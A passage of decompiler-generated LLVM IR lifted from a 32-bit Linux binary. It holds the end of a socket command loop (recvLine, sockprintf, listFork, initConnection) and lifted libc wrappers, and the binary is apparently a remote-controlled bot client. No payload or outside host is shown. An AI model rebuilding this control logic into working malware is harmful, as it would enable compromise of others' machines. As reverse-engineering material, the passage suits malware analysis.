  store i32 %v4_8050286, i32* %eax.global-to-local, align 4
  %v10_805028c = icmp ult i32 %v4_8050286, %stack_var_-40.1.lcssa
  store i1 %v10_805028c, i1* %cf.global-to-local, align 1
  %v5_805028f = icmp slt i32 %v4_8050286, %stack_var_-40.1.lcssa
  br i1 %v5_805028f, label %dec_label_pc_8050270, label %dec_label_pc_8050291.outer

dec_label_pc_8050291.outer:                       ; preds = %dec_label_pc_8050270, %dec_label_pc_804fbf1
  %v0_805029d.pre82 = phi i32 [ %v1_804fc1c, %dec_label_pc_804fbf1 ], [ %v1_8050283, %dec_label_pc_8050270 ]
  %stack_var_-28.1.ph = phi i32 [ %stack_var_-28.0.ph, %dec_label_pc_804fbf1 ], [ %v4_8050286, %dec_label_pc_8050270 ]
  %stack_var_-64.2.ph = phi i8* [ %stack_var_-64.0.ph, %dec_label_pc_804fbf1 ], [ %v22_804fffa, %dec_label_pc_8050270 ]
  %stack_var_-60.3.ph = phi i32 [ %stack_var_-60.0.ph31, %dec_label_pc_804fbf1 ], [ %stack_var_-60.2, %dec_label_pc_8050270 ]
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph32, %dec_label_pc_804fbf1 ], [ %stack_var_-96.1, %dec_label_pc_8050270 ]
  br label %dec_label_pc_8050291.outer26

dec_label_pc_8050291.outer26:                     ; preds = %dec_label_pc_8050291.outer26.backedge, %dec_label_pc_8050291.outer
  %v0_805029d.pre = phi i32 [ %v0_805029d.pre82, %dec_label_pc_8050291.outer ], [ %v0_805029d.pre.pre, %dec_label_pc_8050291.outer26.backedge ]
  %stack_var_-64.2.ph27 = phi i8* [ %stack_var_-64.2.ph, %dec_label_pc_8050291.outer ], [ %stack_var_-64.2.ph27.be, %dec_label_pc_8050291.outer26.backedge ]
  %stack_var_-60.3.ph28 = phi i32 [ %stack_var_-60.3.ph, %dec_label_pc_8050291.outer ], [ %stack_var_-60.2, %dec_label_pc_8050291.outer26.backedge ]
  %stack_var_-96.2.ph29 = phi i32 [ %stack_var_-96.2.ph, %dec_label_pc_8050291.outer ], [ %stack_var_-96.1, %dec_label_pc_8050291.outer26.backedge ]
  %v2_804fc58 = ptrtoint i8* %stack_var_-64.2.ph27 to i32
  br label %dec_label_pc_8050291

dec_label_pc_8050291:                             ; preds = %dec_label_pc_8050291.outer26, %dec_label_pc_804fe85
  %v0_805029d = phi i32 [ %v1_804fe98, %dec_label_pc_804fe85 ], [ %v0_805029d.pre, %dec_label_pc_8050291.outer26 ]
  %stack_var_-60.3 = phi i32 [ %stack_var_-60.2, %dec_label_pc_804fe85 ], [ %stack_var_-60.3.ph28, %dec_label_pc_8050291.outer26 ]
  store i32 %v2_8050291, i32* %eax.global-to-local, align 4
  %v0_8050297 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_8050297, i32* %edx.global-to-local, align 4
  %v5_805029d = icmp ult i32 %v0_805029d, 4
  store i1 %v5_805029d, i1* %cf.global-to-local, align 1
  %v1_80502a0 = add i32 %v0_805029d, -8
  %v2_80502a0 = inttoptr i32 %v1_80502a0 to i32*
  store i32 4096, i32* %v2_80502a0, align 4
  %v2_80502a5 = add i32 %v0_805029d, -12
  %v3_80502a5 = inttoptr i32 %v2_80502a5 to i32*
  store i32 %v2_8050291, i32* %v3_80502a5, align 4
  %v0_80502a6 = load i32, i32* %edx.global-to-local, align 4
  %v2_80502a6 = add i32 %v0_805029d, -16
  %v3_80502a6 = inttoptr i32 %v2_80502a6 to i32*
  store i32 %v0_80502a6, i32* %v3_80502a6, align 4
  %v0_80502a7 = call i32 @recvLine()
  store i32 %v0_80502a7, i32* %eax.global-to-local, align 4
  %v0_80502ac = load i32, i32* @esp, align 4
  %v8_80502b2 = icmp ne i32 %v0_80502a7, -1
  store i1 %v8_80502b2, i1* %cf.global-to-local, align 1
  %v13_80502b2 = icmp eq i32 %v0_80502a7, -1
  %v1_80502b6 = icmp eq i1 %v13_80502b2, false
  br i1 %v1_80502b6, label %dec_label_pc_804fde7, label %dec_label_pc_804fbd9.outer

; uselistorder directives
  uselistorder i32 %v0_80502a7, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-60.3, { 1, 0 }
  uselistorder i32 %v0_805029d, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-96.2.ph29, { 0, 2, 1 }
  uselistorder i8* %stack_var_-64.2.ph27, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.1.ph, { 1, 0, 3, 4, 2 }
  uselistorder i32 %v4_8050286, { 0, 3, 1, 2, 4 }
  uselistorder i32 %storemerge233, { 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8050245, { 2, 1, 0 }
  uselistorder i32 %v3_8050230, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 0, 2, 1 }
  uselistorder i32 %v0_8050226, { 2, 1, 0 }
  uselistorder i32 %v1_80501f0, { 1, 0 }
  uselistorder i32 %v1_80501be, { 1, 0 }
  uselistorder i32 %v5_8050196, { 1, 0 }
  uselistorder i32 %v4_8050193, { 2, 1, 0, 3, 4 }
  uselistorder i32 %stack_var_-40.155, { 0, 5, 4, 2, 3, 1 }
  uselistorder i8* %v3_80501a3, { 2, 0, 1 }
  uselistorder i32 %v1_805017f, { 1, 0 }
  uselistorder i32 %v0_8050148, { 0, 2, 1 }
  uselistorder i32 %storemerge23.in.in, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8050105, { 1, 2, 3, 0 }
  uselistorder i32 %v0_80500e7, { 1, 2, 3, 0 }
  uselistorder i32 %v0_80500cb, { 0, 1, 5, 6, 2, 4, 3, 7 }
  uselistorder i32 %v0_80500b8, { 1, 2, 0 }
  uselistorder i32 %v0_805009d, { 1, 2, 3, 0 }
  uselistorder i1 %v0_8050060, { 1, 0 }
  uselistorder i32 %v7_805005e, { 1, 0 }
  uselistorder i8* %v22_804fffa, { 0, 2, 1 }
  uselistorder i8* %storemerge15, { 1, 0 }
  uselistorder i32 %v5_8050022, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8050013, { 1, 0 }
  uselistorder i32 %storemerge15.in227, { 2, 1, 0 }
  uselistorder i8* %storemerge15228, { 1, 0 }
  uselistorder i32 %v6_804ffcd, { 1, 0 }
  uselistorder i32 %v6_804ffa5, { 1, 0 }
  uselistorder i32 %v6_804ff80, { 1, 0 }
  uselistorder i32 %v1_804ff95, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8* %v5_804ff5d, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_804ff5a, { 9, 8, 13, 6, 7, 11, 10, 0, 4, 1, 2, 3, 12, 14, 5, 15, 16, 17 }
  uselistorder i32 %v6_804ff57, { 1, 0 }
  uselistorder i8* %storemerge16.lcssa, { 1, 0 }
  uselistorder i32 %v5_804ff0a, { 0, 1, 4, 3, 2 }
  uselistorder i32 %stack_var_-96.1, { 1, 0 }
  uselistorder i32 %v4_804fec3, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %v3_804feaf, { 0, 2, 1 }
  uselistorder i32 %v0_804fe76, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v3_804fe71, { 0, 2, 1 }
  uselistorder i32 %v0_804fe5f, { 1, 2, 0 }
  uselistorder i32 %v0_804fe01, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v0_804fdfb, { 1, 0, 2 }
  uselistorder i32 %storemerge17, { 2, 5, 4, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.2, { 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v0_804fc50.in, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804fd89, { 1, 0, 2 }
  uselistorder i32 %storemerge18, { 1, 3, 0, 2 }
  uselistorder i32 %v2_804fd56, { 2, 0, 1 }
  uselistorder i32 %v1_804fd3f, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804fd0a, { 1, 0 }
  uselistorder i32 %v0_804fcaf, { 1, 0, 2 }
  uselistorder i32 %storemerge19, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v2_804fc7e, { 1, 0, 2 }
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %v2_804fc41, { 1, 0 }
  uselistorder i32 %v0_804fbf1, { 0, 2, 1 }
  uselistorder i8* %storemerge16190, { 2, 0, 1, 3 }
  uselistorder i32 %v5_804fef7, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v2_8050084, { 6, 7, 0, 1, 2, 3, 4, 5, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %v2_8050291, { 15, 16, 0, 1, 6, 5, 7, 8, 2, 10, 9, 11, 12, 13, 14, 3, 4 }
  uselistorder i32 %v2_804fb3f, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804fae6, { 2, 1, 0, 3, 4 }
  uselistorder i8* %tmp164, { 1, 0, 2 }
  uselistorder i32 %v2_804fa6a, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v7_804fa17, { 1, 0 }
  uselistorder i32 %v3_804fae313, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 5, 4, 1, 0, 3, 2, 6 }
  uselistorder i32* %tmp160, { 1, 0, 2 }
  uselistorder i1 %v5_804f95a, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v2_804f91f, { 1, 0, 2 }
  uselistorder i1 %v5_804f90b, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v2_804f87b, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-24, { 2, 1, 0, 3 }
  uselistorder i8** %stack_var_-5888, { 22, 25, 26, 21, 20, 19, 16, 15, 18, 17, 23, 24, 14, 12, 11, 13, 10, 9, 8, 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_-624, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-1648, { 1, 0, 2 }
  uselistorder i8** %stack_var_-36, { 4, 2, 1, 3, 0 }
  uselistorder i32* %edx.global-to-local, { 9, 10, 19, 20, 21, 22, 23, 24, 0, 1, 8, 3, 2, 4, 6, 5, 7, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %eax.global-to-local, { 36, 37, 85, 83, 84, 132, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 103, 104, 98, 99, 100, 101, 102, 105, 106, 107, 108, 109, 118, 110, 111, 114, 115, 112, 113, 131, 130, 116, 117, 119, 120, 136, 135, 121, 122, 123, 126, 127, 128, 124, 125, 0, 1, 2, 3, 4, 5, 6, 7, 134, 133, 8, 9, 10, 11, 12, 13, 15, 16, 14, 17, 18, 19, 35, 20, 21, 24, 22, 23, 25, 26, 29, 27, 28, 30, 31, 32, 33, 34, 38, 39, 40, 42, 41, 129, 43, 44, 45, 46, 47, 50, 48, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82 }
  uselistorder i1* %cf.global-to-local, { 24, 25, 79, 78, 117, 80, 81, 88, 82, 83, 84, 85, 86, 87, 113, 89, 90, 91, 96, 97, 92, 93, 94, 95, 98, 99, 100, 101, 102, 115, 105, 103, 104, 116, 106, 107, 119, 108, 109, 111, 112, 110, 0, 1, 2, 3, 118, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 23, 17, 18, 19, 20, 21, 22, 26, 27, 28, 29, 114, 30, 31, 32, 33, 34, 40, 41, 35, 36, 37, 77, 38, 39, 42, 43, 44, 47, 48, 49, 50, 51, 45, 46, 55, 56, 52, 53, 54, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 1, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 5, 6, 0, 4, 1, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @szprintf, { 91, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28 }
  uselistorder i32 ()* @listFork, { 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 3, 1, 2 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_8057a97.21 to i32), { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @sockprintf, { 1, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 21, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sleep, { 0, 2, 1 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_8058c99.448 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 4 to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i8* bitcast (i8** @global_var_8058c8d.445 to i8*), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_8058c80.444 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8058c7e.443 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint ([19 x i8]* @global_var_8058c6b.442 to i32), { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 8 to i32*), { 6, 7, 0, 1, 2, 3, 8, 9, 4, 5 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 8, 9, 10, 0, 11, 21, 22, 12, 13, 14, 15, 16, 17, 18, 1, 2, 3, 4, 5, 6, 7, 19, 20 }
  uselistorder i32* inttoptr (i32 12 to i32*), { 7, 2, 0, 1, 3, 4, 8, 6, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_8058c6a.441 to i32), { 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_8050291.outer26, { 1, 0 }
  uselistorder label %dec_label_pc_8050270, { 1, 0 }
  uselistorder label %dec_label_pc_8050226, { 1, 0 }
  uselistorder label %dec_label_pc_8050193, { 1, 0 }
  uselistorder label %dec_label_pc_8050167, { 1, 0 }
  uselistorder label %dec_label_pc_8050131, { 1, 0 }
  uselistorder label %dec_label_pc_8050005, { 1, 0 }
  uselistorder label %dec_label_pc_804fff4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ffeb, { 1, 0 }
  uselistorder label %dec_label_pc_804ff87, { 1, 0 }
  uselistorder label %dec_label_pc_804ff1f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ff16, { 1, 0 }
  uselistorder label %dec_label_pc_8050291.outer26.backedge, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_804feeb, { 1, 0 }
  uselistorder label %dec_label_pc_804fde4, { 1, 0 }
  uselistorder label %dec_label_pc_804fd75, { 1, 0 }
  uselistorder label %dec_label_pc_804fd53, { 1, 0 }
  uselistorder label %dec_label_pc_804fc9b, { 1, 0 }
  uselistorder label %dec_label_pc_804fc71, { 1, 0 }
  uselistorder label %dec_label_pc_804fbe2, { 1, 0 }
  uselistorder label %dec_label_pc_804fbd9.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fbb3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fb3a, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804fa35, { 1, 0 }
  uselistorder label %dec_label_pc_804f993, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80502ca = call i32 @vfork()
  %v5_80502cd = icmp ult i32 %v0_80502ca, -4095
  %v1_80502d2 = icmp eq i1 %v5_80502cd, false
  call void @__pseudo_cond_branch(i1 %v1_80502d2, i32 134563404)
  ret i32 %v0_80502ca
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80502dc = load i32, i32* @edi, align 4
  %v0_80502dd = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80502f1 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_80502fb = icmp ugt i32 %v1_80502f1, 2
  br i1 %v6_80502fb, label %dec_label_pc_805030b, label %dec_label_pc_80502fd

dec_label_pc_80502fd:                             ; preds = %entry
  %v4_8050301 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_80502f1)
  br label %dec_label_pc_805032d

dec_label_pc_805030b:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8050313 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8050313, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_8050313, -4095
  br i1 %tmp17, label %dec_label_pc_805032b, label %dec_label_pc_805031f

dec_label_pc_805031f:                             ; preds = %dec_label_pc_805030b
  %v1_805031f = call i32 @__errno_location(i32 %v0_80502dd)
  %v0_8050324 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050324 = sub i32 0, %v0_8050324
  %v2_8050326 = inttoptr i32 %v1_805031f to i32*
  store i32 %v1_8050324, i32* %v2_8050326, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805032b

dec_label_pc_805032b:                             ; preds = %dec_label_pc_805030b, %dec_label_pc_805031f
  %v0_805032b = phi i32 [ %v2_8050313, %dec_label_pc_805030b ], [ -1, %dec_label_pc_805031f ]
  br label %dec_label_pc_805032d

dec_label_pc_805032d:                             ; preds = %dec_label_pc_80502fd, %dec_label_pc_805032b
  %v0_8050332 = phi i32 [ %v4_8050301, %dec_label_pc_80502fd ], [ %v0_805032b, %dec_label_pc_805032b ]
  store i32 %v0_80502dd, i32* @ebx, align 4
  store i32 %v0_80502dc, i32* @edi, align 4
  ret i32 %v0_8050332

; uselistorder directives
  uselistorder i32 %v2_8050313, { 1, 0, 2 }
  uselistorder i32 %v0_80502dd, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805032d, { 1, 0 }
  uselistorder label %dec_label_pc_805032b, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050334 = load i32, i32* @edi, align 4
  store i32 %v0_8050334, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_805034c = load i32, i32* @ebx, align 4
  %v1_8050354 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8050354, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_8050354, -4095
  br i1 %tmp11, label %dec_label_pc_805036c, label %dec_label_pc_8050360

dec_label_pc_8050360:                             ; preds = %entry
  %v1_8050360 = call i32 @__errno_location(i32 %v0_805034c)
  %v0_8050365 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050365 = sub i32 0, %v0_8050365
  %v2_8050367 = inttoptr i32 %v1_8050360 to i32*
  store i32 %v1_8050365, i32* %v2_8050367, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805036c

dec_label_pc_805036c:                             ; preds = %entry, %dec_label_pc_8050360
  %v0_805036c = phi i32 [ %v1_8050354, %entry ], [ -1, %dec_label_pc_8050360 ]
  %v2_8050371 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050371, i32* %edi.global-to-local, align 4
  ret i32 %v0_805036c

; uselistorder directives
  uselistorder i32 %v1_8050354, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805036c, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805039c = load i32, i32* @edi, align 4
  store i32 %v0_805039c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_80503a4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80503ac = call i32 @chdir(i32 %v0_80503a4)
  store i32 %v0_80503a4, i32* @ebx, align 4
  store i32 %v1_80503ac, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_80503ac, -4095
  br i1 %tmp8, label %dec_label_pc_80503c4, label %dec_label_pc_80503b8

dec_label_pc_80503b8:                             ; preds = %entry
  %v1_80503b8 = call i32 @__errno_location(i32 %v0_80503a4)
  %v0_80503bd = load i32, i32* %edi.global-to-local, align 4
  %v1_80503bd = sub i32 0, %v0_80503bd
  %v2_80503bf = inttoptr i32 %v1_80503b8 to i32*
  store i32 %v1_80503bd, i32* %v2_80503bf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80503c4

dec_label_pc_80503c4:                             ; preds = %entry, %dec_label_pc_80503b8
  %v0_80503c4 = phi i32 [ %v1_80503ac, %entry ], [ -1, %dec_label_pc_80503b8 ]
  %v2_80503c6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80503c6, i32* @edx, align 4
  %v2_80503c8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80503c8, i32* @edi, align 4
  ret i32 %v0_80503c4

; uselistorder directives
  uselistorder i32 %v1_80503ac, { 1, 0, 2 }
  uselistorder i32 %v0_80503a4, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80503c4, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80503cc = load i32, i32* @edi, align 4
  store i32 %v0_80503cc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80503d4 = load i32, i32* @ebx, align 4
  %v1_80503dc = call i32 @close(i32 %arg1)
  store i32 %v0_80503d4, i32* @ebx, align 4
  store i32 %v1_80503dc, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_80503dc, -4095
  br i1 %tmp8, label %dec_label_pc_80503f4, label %dec_label_pc_80503e8

dec_label_pc_80503e8:                             ; preds = %entry
  %v1_80503e8 = call i32 @__errno_location(i32 %v0_80503d4)
  %v0_80503ed = load i32, i32* %edi.global-to-local, align 4
  %v1_80503ed = sub i32 0, %v0_80503ed
  %v2_80503ef = inttoptr i32 %v1_80503e8 to i32*
  store i32 %v1_80503ed, i32* %v2_80503ef, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80503f4

dec_label_pc_80503f4:                             ; preds = %entry, %dec_label_pc_80503e8
  %v0_80503f4 = phi i32 [ %v1_80503dc, %entry ], [ -1, %dec_label_pc_80503e8 ]
  %v2_80503f6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80503f6, i32* @edx, align 4
  %v2_80503f8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80503f8, i32* @edi, align 4
  ret i32 %v0_80503f4

; uselistorder directives
  uselistorder i32 %v1_80503dc, { 1, 0, 2 }
  uselistorder i32 %v0_80503d4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80503f4, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80503fc = load i32, i32* @ebx, align 4
  store i32 %v0_80503fc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805040f = call i32 @dup2(i32 %v0_80503fc, i32 %tmp4)
  store i32 %v2_805040f, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_805040f, -4095
  br i1 %tmp8, label %dec_label_pc_8050428, label %dec_label_pc_805041c

dec_label_pc_805041c:                             ; preds = %entry
  %v0_805041c = load i32, i32* %stack_var_-4, align 4
  %v1_805041c = call i32 @__errno_location(i32 %v0_805041c)
  %v0_8050421 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050421 = sub i32 0, %v0_8050421
  %v2_8050423 = inttoptr i32 %v1_805041c to i32*
  store i32 %v1_8050421, i32* %v2_8050423, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050428

dec_label_pc_8050428:                             ; preds = %entry, %dec_label_pc_805041c
  %v0_8050428 = phi i32 [ %v2_805040f, %entry ], [ -1, %dec_label_pc_805041c ]
  %v2_805042c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805042c, i32* @ebx, align 4
  ret i32 %v0_8050428

; uselistorder directives
  uselistorder i32 %v2_805040f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050428, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050430 = load i32, i32* @ebx, align 4
  store i32 %v0_8050430, i32* %stack_var_-4, align 4
  %v1_8050439 = call i32 @fork(i32 %v0_8050430)
  store i32 %v1_8050439, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8050439, -4095
  br i1 %tmp6, label %dec_label_pc_8050450, label %dec_label_pc_8050444

dec_label_pc_8050444:                             ; preds = %entry
  %v0_8050444 = load i32, i32* %stack_var_-4, align 4
  %v1_8050444 = call i32 @__errno_location(i32 %v0_8050444)
  %v0_8050449 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050449 = sub i32 0, %v0_8050449
  %v2_805044b = inttoptr i32 %v1_8050444 to i32*
  store i32 %v1_8050449, i32* %v2_805044b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050450

dec_label_pc_8050450:                             ; preds = %entry, %dec_label_pc_8050444
  %v0_8050450 = phi i32 [ %v1_8050439, %entry ], [ -1, %dec_label_pc_8050444 ]
  %v2_8050452 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050452, i32* @edx, align 4
  %v2_8050454 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050454, i32* @ebx, align 4
  ret i32 %v0_8050450

; uselistorder directives
  uselistorder i32 %v1_8050439, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050450, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-44, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %v0_8050458 = load i32, i32* @ebp, align 4
  %v0_8050459 = load i32, i32* @edi, align 4
  %v0_805045a = load i32, i32* @esi, align 4
  %v0_805045b = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8050467 = icmp eq i32 %arg2, 0
  %v1_8050469 = icmp eq i1 %v1_8050467, false
  br i1 %v1_8050469, label %dec_label_pc_8050494, label %dec_label_pc_805046b

dec_label_pc_805046b:                             ; preds = %entry
